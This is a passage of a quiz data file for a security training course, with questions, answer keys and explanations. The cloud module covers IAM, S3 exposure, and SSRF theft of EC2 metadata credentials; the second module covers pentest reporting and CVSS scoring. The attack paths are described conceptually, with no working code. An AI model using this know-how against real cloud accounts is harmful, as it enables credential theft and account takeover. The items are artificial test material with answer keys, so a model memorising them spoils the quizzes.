        explanation:
          "AWS calls the provider's side of the split 'security of the cloud' -- physical data centers, hardware, and the host hypervisor/global network infrastructure.",
      },
      {
        question:
          "On a PaaS service like Amazon RDS, which responsibilities fall to the customer?",
        options: [
          "Patching the underlying guest operating system",
          "Mainly data, access control, and service-level configuration, since the provider manages the OS/platform",
          "Nothing -- PaaS shifts all responsibility to the provider",
          "Securing the physical hardware hosting the database",
        ],
        correctIndex: 1,
        explanation:
          "On PaaS, the provider manages the OS and platform, leaving the customer responsible mainly for data, access, and how they configure the service.",
      },
      {
        question:
          "Why does the module treat most cloud security findings (public buckets, open security groups, over-permissioned roles) as customer failures rather than provider failures?",
        options: [
          "Because providers never get breached",
          "Because customers can't configure these settings at all",
          "Because these misconfigurations sit on the customer side of the shared-responsibility line, and the provider's underlying infrastructure was never touched",
          "Because these are always caused by zero-day exploits in the provider's hypervisor",
        ],
        correctIndex: 2,
        explanation:
          "These finding classes are customer-side configuration failures -- the provider's underlying infrastructure isn't what's exploited.",
      },
    ],
  },
  {
    topicId: "m20-2",
    questions: [
      {
        question:
          "Which IAM building block is backed by short-lived credentials instead of a permanent access key?",
        options: ["A user", "A group", "A role", "A policy"],
        correctIndex: 2,
        explanation:
          "A role is a temporary identity assumed by a user, service, or account, backed by short-lived credentials, unlike a user's long-term access key.",
      },
      {
        question:
          "An IAM policy statement grants Action: '*' and Resource: '*'. What does this represent?",
        options: [
          "A properly scoped least-privilege grant",
          "A syntactically invalid policy that AWS will reject",
          "A policy that only applies to S3",
          "A wildcard grant giving that identity administrator-equivalent power over the entire account, and the root cause of most cloud privilege-escalation findings",
        ],
        correctIndex: 3,
        explanation:
          "Action:* combined with Resource:* is a wildcard grant equivalent to admin-level access account-wide, and the root cause of most cloud privilege-escalation findings.",
      },
      {
        question:
          "What is the first command typically run during a cloud assessment, and why?",
        options: [
          "aws iam list-attached-user-policies, because it edits permissions",
          "aws sts get-caller-identity, because it reveals exactly which identity the current credentials belong to",
          "aws s3 ls, because it lists all buckets first",
          "aws cloudtrail describe-trails, because logging must be checked first",
        ],
        correctIndex: 1,
        explanation:
          "aws sts get-caller-identity confirms which user, role, or assumed-role session the current credentials belong to, before anything else is enumerated.",
      },
    ],
  },
  {
    topicId: "m20-3",
    questions: [
      {
        question: "By default, are S3 buckets public or private?",
        options: [
          "Public by default; must be explicitly locked down",
          "Private by default; public exposure requires an explicit bucket policy or ACL change",
          "Public only for the AWS root account",
          "Determined randomly by AWS",
        ],
        correctIndex: 1,
        explanation:
          "S3 buckets are private by default -- exposure comes from an explicit policy or ACL granting access to Everyone or Any authenticated AWS user.",
      },
      {
        question:
          "What AWS CLI flag lets an attacker query a public S3 bucket without any AWS credentials?",
        options: [
          "--public-only",
          "--anonymous-mode",
          "--no-sign-request",
          "--skip-auth",
        ],
        correctIndex: 2,
        explanation:
          "--no-sign-request makes fully anonymous, unauthenticated calls against a public bucket.",
      },
      {
        question:
          "What is the recommended defensive baseline against public S3 exposure, according to the module?",
        options: [
          "Manually reviewing every individual bucket policy for correctness",
          "S3 Block Public Access, an account- or bucket-level setting that overrides any public-granting policy or ACL underneath it",
          "Renaming buckets to be harder to guess",
          "Disabling S3 entirely",
        ],
        correctIndex: 1,
        explanation:
          "Block Public Access is the blunt, effective override recommended instead of relying on getting every individual bucket policy right.",
      },
    ],
  },
  {
    topicId: "m20-4",
    questions: [
      {
        question:
          "What address does the EC2 Instance Metadata Service listen on?",
        options: [
          "10.0.0.1",
          "169.254.169.254, a link-local address reachable only from inside the instance",
          "8.8.8.8",
          "The instance's public IP address",
        ],
        correctIndex: 1,
        explanation:
          "IMDS lives at the link-local address 169.254.169.254, reachable only from inside the instance itself.",
      },
      {
        question:
          "Why does an SSRF vulnerability become a full cloud-account compromise when it reaches IMDS?",
        options: [
          "IMDS deletes the vulnerable application automatically",
          "The metadata response includes the attached IAM role's temporary access key/secret key/session token, usable directly against the AWS API",
          "IMDS grants root shell access to the instance",
          "IMDS always contains database passwords",
        ],
        correctIndex: 1,
        explanation:
          "IMDS exposes the instance's IAM role credentials, which the attacker can use directly against the AWS API with that role's permissions.",
      },
      {
        question:
          "Why can't a simple GET-only SSRF vulnerability complete the IMDSv2 attack flow?",
        options: [
          "IMDSv2 requires an explicit PUT request to /latest/api/token to obtain a session token before any metadata GET is honored",
          "IMDSv2 blocks all traffic from EC2 instances",
          "IMDSv2 requires a hardware security key",
          "IMDSv2 only responds to HTTPS, and SSRF can only use HTTP",
        ],
        correctIndex: 0,
        explanation:
          "IMDSv2 requires a PUT to obtain a token before any GET is honored, which a simple GET-only SSRF (e.g. via redirects) can't complete.",
      },
    ],
  },
  {
    topicId: "m20-5",
    questions: [
      {
        question:
          "Which protocols does Entra ID use for identity, in contrast to on-prem Active Directory's Kerberos/NTLM/LDAP?",
        options: [
          "FTP and Telnet",
          "IPsec and SNMP",
          "OAuth 2.0, OpenID Connect, and SAML",
          "RDP and SMB",
        ],
        correctIndex: 2,
        explanation:
          "Entra ID is a cloud-native identity provider built around HTTPS-based OAuth 2.0, OpenID Connect, and SAML, not the Kerberos/NTLM/LDAP on-prem AD uses.",
      },
      {
        question: "What is a Conditional Access policy?",
        options: [
          "A static Group Policy Object applied at logon",
          "A Kerberos ticket-granting mechanism",
          "A firewall rule for on-prem domain controllers",
          "An if-this-then-that rule evaluated at sign-in time, such as requiring MFA for sign-ins outside the corporate network",
        ],
        correctIndex: 3,
        explanation:
          "Conditional Access policies are if-this-then-that rules evaluated at sign-in, giving fine-grained, risk-aware access control.",
      },
      {
        question: "In hybrid identity, what does Azure AD Connect do?",
        options: [
          "Encrypts all on-prem traffic",
          "Syncs on-prem AD users into Entra ID, so the same identity authenticates against both systems for different resources",
          "Replaces on-prem AD entirely",
          "Blocks cloud sign-ins from synced accounts",
        ],
        correctIndex: 1,
        explanation:
          "Azure AD Connect syncs on-prem AD users into Entra ID, enabling hybrid identity across both systems.",
      },
    ],
  },
  {
    topicId: "m20-6",
    questions: [
      {
        question: "What does AWS CloudTrail record?",
        options: [
          "Only failed login attempts",
          "Network packet contents",
          "Every API call against the account -- caller identity, source IP, action, resource, and success/failure",
          "Only console (UI) logins, not the API",
        ],
        correctIndex: 2,
        explanation:
          "CloudTrail logs every API call: who made it, from what IP, what action, against what resource, and whether it succeeded.",
      },
      {
        question:
          "What does GuardDuty add on top of CloudTrail, VPC flow logs, and DNS logs?",
        options: [
          "Automatic firewall rule creation",
          "Managed threat detection using threat intelligence and anomaly detection, e.g. flagging API calls from Tor exit nodes",
          "Encryption of all account data",
          "Automatic deletion of compromised resources",
        ],
        correctIndex: 1,
        explanation:
          "GuardDuty is a managed threat-detection service layered on those logs, using threat intel and anomaly detection to flag things like Tor exit node activity.",
      },
      {
        question:
          "Why is an IAM policy granting cloudtrail:StopLogging or cloudtrail:DeleteTrail to too many identities considered a finding on its own?",
        options: [
          "Because it slows down API calls",
          "Because it costs extra money to keep the permission enabled",
          "Because it violates a naming convention",
          "Because it's a pre-positioned way to blind incident response the moment an attacker needs it, independent of whether logging is currently active",
        ],
        correctIndex: 3,
        explanation:
          "This permission is a legitimate finding regardless of current logging status because it's a pre-positioned way to blind IR after a foothold is gained.",
      },
    ],
  },
  {
    topicId: "m20-7",
    questions: [
      {
        question:
          "What AWS access key prefix indicates a temporary/session credential rather than a long-term one?",
        options: ["AKIA", "IAM-", "TEMP-", "ASIA"],
        correctIndex: 3,
        explanation:
          "AKIA prefixes long-term access keys while ASIA prefixes temporary/session credentials.",
      },
      {
        question:
          "Why does deleting a secret in a later Dockerfile step (RUN rm ...) fail to remove it from the image?",
        options: [
          "Docker automatically re-adds deleted files",
          "Each image layer is an immutable diff, so the secret still exists in the earlier layer's filesystem diff and can be extracted from that layer",
          "Docker images cannot contain secrets at all",
          "The secret gets encrypted automatically",
        ],
        correctIndex: 1,
        explanation:
          "Image layers are immutable and independently extractable, so a secret set in an earlier layer persists even if a later layer deletes the file.",
      },
      {
        question:
          "What is the correct remediation once an AWS key has been exposed in a public GitHub repo, even briefly?",
        options: [
          "Simply delete it from the latest commit",
          "Rename the repository",
          "Rotate/revoke the key, since git history still contains it and it must be treated as fully compromised",
          "Wait to see if it gets abused before acting",
        ],
        correctIndex: 2,
        explanation:
          "Any credential that touched a public repo must be rotated/revoked, not just removed from the latest commit, since history retains it.",
      },
    ],
  },
  {
    topicId: "m20-8",
    questions: [
      {
        question:
          "After obtaining a new AWS credential through any initial-access vector, what is the very first command run?",
        options: [
          "aws s3 ls to look for buckets",
          "aws iam create-user to make a backup account",
          "aws sts get-caller-identity, to confirm exactly which identity/role was obtained",
          "aws ec2 describe-instances",
        ],
        correctIndex: 2,
        explanation:
          "The first move with any new credential is aws sts get-caller-identity to confirm exactly which identity/role was obtained.",
      },
      {
        question:
          "How can a wildcard iam:PassRole or iam:CreatePolicyVersion permission lead to privilege escalation?",
        options: [
          "It requires exploiting a new zero-day vulnerability",
          "It lets the attacker grant themselves broader access purely by abusing an over-broad policy someone else already configured, without exploiting anything new",
          "It only affects read-only S3 access",
          "It automatically notifies AWS support",
        ],
        correctIndex: 1,
        explanation:
          "This is privilege escalation via an over-broad existing policy, not a new vulnerability -- the attacker attaches a fully permissive policy to themselves or an assumable role.",
      },
      {
        question:
          "Why does the module argue that chained low-severity cloud findings deserve a combined severity rating?",
        options: [
          "Because low-severity findings are never real risks on their own",
          "Because AWS requires combined ratings for compliance",
          "Because individual findings can't be reproduced",
          "Because each step (a bucket with no secrets, one broad permission, incomplete logging) can look survivable in isolation, but together the chain produces full account takeover",
        ],
        correctIndex: 3,
        explanation:
          "Each step often looks low-to-medium severity alone, but the chain together is what turns three findings into a full account takeover.",
      },
    ],
  },
  {
    topicId: "m21-1",
    questions: [
      {
        question:
          "What happens to the value of a vulnerability that a client cannot understand, verify, or prioritise, according to this topic?",
        options: [
          "It is automatically classified as a false positive",
          "It is functionally the same as a vulnerability that was never found — value is only realised through the report",
          "It still counts as full value because it was technically discovered",
          "It gets escalated automatically to Critical severity",
        ],
        correctIndex: 1,
        explanation:
          "The topic states an unreported or unusable vulnerability is functionally identical to one never found, since value is only realised through the report.",
      },
      {
        question:
          "This topic reframes the exploit, the shell, and the loot from an engagement as:",
        options: [
          "The actual deliverable the client purchased",
          "Irrelevant details that shouldn't be mentioned in the report",
          "Research artifacts, with the report being the actual product",
          "The primary basis for CVSS scoring",
        ],
        correctIndex: 2,
        explanation:
          "The exploit, shell, and loot are described as research artifacts; the report is the deliverable the client actually purchased and acts on.",
      },
      {
        question:
          "Per this topic, what determines whether a strong technical engagement is perceived as worthwhile by the client?",
        options: [
          "The number of exploits chained together",
          "The report — a weak report can waste a strong engagement, while a strong report can make even modest findings feel worth the spend",
          "How advanced the tools used were",
          "How quickly access was obtained",
        ],
        correctIndex: 1,
        explanation:
          "The topic states a weak report can waste a strong engagement, and a strong report can make modest findings feel worth the client's spend.",
      },
    ],
  },
  {
    topicId: "m21-2",
    questions: [
      {
        question:
          "A finding is scored with a Base score of 8.2. Which severity band does it fall into per CVSS v3.1?",
        options: [
          "Medium (4.0-6.9)",
          "Low (0.1-3.9)",
          "Critical (9.0-10.0)",
          "High (7.0-8.9)",
        ],
        correctIndex: 3,
        explanation:
          "The stated severity bands place 7.0-8.9 in High, and 8.2 falls in that range.",
      },
      {
        question: "What does the CVSS Scope metric capture?",
        options: [
          "Whether a successful exploit can affect resources beyond the vulnerable component's own security authority, e.g. a sandbox escape",
          "How many customers are affected by the vulnerability",
          "Whether the vulnerability was found via passive or active recon",
          "The number of CVEs related to the finding",
        ],
        correctIndex: 0,
        explanation:
          "Scope captures whether an exploit can affect resources beyond the vulnerable component's own security authority, such as a sandbox escape.",
      },
      {
        question:
          "Why does this topic recommend scoring with FIRST's official CVSS calculator instead of eyeballing a number?",
        options: [
          "Because eyeballing always produces a higher score",
          "Because the calculator is required by law",
          "Because reproducibility of the score matters as much as the score itself when a client challenges it",
          "Because manual scoring is impossible without internet access",
        ],
        correctIndex: 2,
        explanation:
          "The topic states reproducibility of the score matters as much as the score itself when a client challenges it.",
      },
    ],
  },
  {
    topicId: "m21-3",
    questions: [
      {
        question:
          "Why does the executive summary translate 'authentication bypass via JWT algorithm confusion' into 'an external attacker can log in as any customer, including administrators'?",
        options: [
          "Because JWT bugs are always low severity",
          "Because the summary is written for a non-technical reader who needs impact framed in plain business language, not technique",
          "Because CVSS scoring requires plain language",
          "Because technical terms are banned from the entire report",
        ],
        correctIndex: 1,
        explanation:
          "The executive summary is written for a reader with zero familiarity with attack techniques, so it translates technique into business impact.",
      },
      {
        question: "What should the executive summary lead with?",
        options: [
          "A full chronological account of every step of the engagement",
          "Every CVE identifier discovered, in numerical order",
          "Terminal commands used during testing",
          "Overall risk posture and the highest-severity findings' business consequences",
        ],
        correctIndex: 3,
        explanation:
          "The topic states the summary should lead with overall risk posture and the highest-severity findings' business consequences, not a chronological account.",
      },
      {
        question:
          "Why does overstating scope or coverage in the executive summary damage the report?",
        options: [
          "It erodes trust the moment someone checks what was actually tested",
          "It automatically lowers all CVSS scores",
          "It is illegal under CVSS v3.1",
          "It has no real consequence since the summary isn't read",
        ],
        correctIndex: 0,
        explanation:
          "The topic warns that an executive summary overstating coverage erodes trust the moment someone checks.",
      },
    ],
  },
  {
    topicId: "m21-4",
    questions: [
      {
        question:
          "Why does the standard finding anatomy include 'evidence' as a distinct component from the description?",
        options: [
          "Evidence is optional and rarely included",
          "Evidence replaces the need for reproduction steps",
          "Evidence must be proof — a real screenshot or full request/response pair — not a paraphrase of what was seen",
          "Evidence is only required for Critical findings",
        ],
        correctIndex: 2,
        explanation:
          "The topic states evidence means proof, not narration — a real screenshot or full HTTP request/response pair.",
      },
      {
        question:
          "Why does generic remediation advice like 'sanitize input' get ignored by developers, per this topic?",
        options: [
          "Because developers don't read remediation sections",
          "Because it gives the developer nothing specific to act on — no named parameter, header, config, or code pattern",
          "Because it contradicts the CVSS score",
          "Because sanitizing input is never the correct fix",
        ],
        correctIndex: 1,
        explanation:
          "The topic states generic advice gets ignored because it gives the developer nothing to act on, unlike naming the specific parameter or fix pattern.",
      },
      {
        question:
          "Why should the affected asset be listed precisely (hostname, IP, endpoint, parameter)?",
        options: [
          "So the executive summary can be skipped entirely",
          "So the CVSS score can be calculated automatically",
          "Because vague assets are considered false positives",
          "So a large finding list can be triaged by system owner without re-reading every description",
        ],
        correctIndex: 3,
        explanation:
          "The topic states a precise affected asset lets a large finding list be triaged by system owner without re-reading every description.",
      },
    ],
  },
  {
    topicId: "m21-5",
    questions: [
      {
        question:
          "Per this topic, what timeframe should be attached to a Critical-severity finding?",
        options: [
          "An immediate or days-scale fix window",
          "The next scheduled release or patch cycle",
          "A multi-month window since Critical findings take longest to fix",
          "No specific timeframe — severity alone communicates urgency",
        ],
        correctIndex: 0,
        explanation:
          "The topic ties Critical findings to an immediate or days-scale fix window, with High at weeks and Medium/Low at the next release cycle.",
      },
      {
        question:
          "Why does a remediation recommendation with no deadline risk being ignored?",
        options: [
          "Because CVSS forbids scoring undated findings",
          "Because undated findings are automatically marked false positive",
          "Because clients are legally required to ignore them",
          "Because clients' engineering teams triage against other dated work, and an undated finding quietly loses that competition",
        ],
        correctIndex: 3,
        explanation:
          "The topic states a timeline with no deadline is a suggestion, not a requirement, since undated findings lose out against dated work.",
      },
      {
        question:
          "If a WAF rule offers a quick compensating control while a code change is the proper long-term fix, what should the report do?",
        options: [
          "Only mention the WAF rule and omit the code fix",
          "Report both, and be explicit about which is temporary",
          "Only mention the code fix since the WAF rule is irrelevant",
          "Recommend disabling the WAF until the code fix ships",
        ],
        correctIndex: 1,
        explanation:
          "The topic states where both a quick compensating control and a slower proper fix exist, the report should include both and be explicit about which is temporary.",
      },
    ],
  },
  {
    topicId: "m21-6",
    questions: [
      {
        question:
          "What happens the first time a client successfully disputes an inflated severity score, per this topic?",
        options: [
          "Nothing — the rest of the report remains fully trusted",
          "The report is automatically discarded",
          "Every other score in the report becomes suspect, eroding trust",
          "The CVSS calculator is blamed instead of the assessor",
        ],
        correctIndex: 2,
        explanation:
          "The topic states inflated severity erodes trust fast, because once a client disputes and wins on one score, every other score becomes suspect.",
      },
      {
        question:
          "Why is a finding with missing or vague reproduction steps effectively as bad as an incorrect finding?",
        options: [
          "Because it's unverifiable, and the client's team can't confirm it's fixed, so it's indistinguishable from a finding that was never real",
          "Because CVSS requires repro steps for scoring",
          "Because unverifiable findings are automatically rescored as Low",
          "Because vague findings are always false positives by definition",
        ],
        correctIndex: 0,
        explanation:
          "The topic states missing reproduction steps make a finding unverifiable, and an unverifiable finding is indistinguishable from an incorrect one.",
      },
      {
        question:
          "What does failing to flag false positives or already-mitigated findings signal to the client, per this topic?",
        options: [
          "That the engagement covered more scope than agreed",
          "That the CVSS scores are inflated",
          "That reproduction steps are missing",
          "That the report wasn't actually reviewed by a human before delivery",
        ],
        correctIndex: 3,
        explanation:
          "The topic states failing to flag false positives or already-mitigated findings signals the report wasn't actually reviewed by a human before delivery.",
      },
    ],
  },
  {
    topicId: "m21-7",
    questions: [
      {
        question:
          "How many capstone findings does this exercise require you to assign a full CVSS v3.1 base score to?",
        options: [
          "Exactly one",
          "At least three",
          "All findings from the entire capstone",
          "None — only the highest severity finding needs scoring",
        ],
        correctIndex: 1,
        explanation:
          "The exercise requires assigning a full CVSS v3.1 base score to at least three of your capstone findings.",
      },
      {
        question:
          "For which finding does this exercise require a complete technical write-up (title, CVSS score, affected asset, description, evidence, reproduction steps, remediation)?",
        options: [
          "Every finding from the capstone",
          "A finding chosen at random",
          "Your single highest-severity capstone finding",
          "Only findings rated Medium or below",
        ],
        correctIndex: 2,
        explanation:
          "The exercise requires the complete technical finding write-up for your single highest-severity capstone finding.",
      },
      {
        question:
          "What is the final step this exercise asks you to take before considering your write-up done?",
        options: [
          "Compare it against the common-mistakes checklist from this module",
          "Submit it directly to FIRST.org for review",
          "Delete all evidence to protect client confidentiality",
          "Rescore every finding as Critical for consistency",
        ],
        correctIndex: 0,
        explanation:
          "The exercise instructs comparing your finished write-up against the common-mistakes checklist from this module before considering it done.",
      },
    ],
  },
]
